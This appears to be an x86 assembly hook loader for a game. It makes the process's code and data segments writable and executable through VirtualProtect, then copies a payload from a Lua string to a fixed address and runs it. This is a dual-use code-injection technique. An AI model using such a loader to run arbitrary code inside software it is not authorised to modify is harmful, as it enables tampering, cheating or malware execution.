%include 'globals.inc'

bits 32
section text
org loaderBase

loader:
		mov dword [ecx], 76E3CCh ; restore entity obj
		push 0
		call 57A65Eh			 ; call original DestroyEntity()
		
		mov eax, [hookRsrcFlag]
		test eax, eax
		jnz .copyPayload
		
        
        ; cache cursor ?    
        
		push bufferOffset		; get write permissions for .text, .data, and .rsrc
		push 40h				; new access: R/W/X
		push 64B000h			; length
		push 401000h			; start of segment 
		call [virtualProtect]
		test eax, eax
		jz .abort
		
		call [lua_open]
		mov [rtState], eax
		
		mov dword [hookRsrcFlag], 1

.copyPayload:	
		
		push 2
		push ebx
		call [lua_tostring]
		add esp, 8
		
		push dword [eax]		; start of payload
	    
		push dword [eax+4]		; num bytes
		add eax, 8
		push eax				; data source
		push hookBase
		call memcpy				; cdecl
		add esp, 12
		
		pop eax
		call eax				; run payload
		
.abort:
		retn 4

bufferOffset:

padding equ (4 - (($-$$) % 4)) % 4
times padding int3				; pad to n*4bytes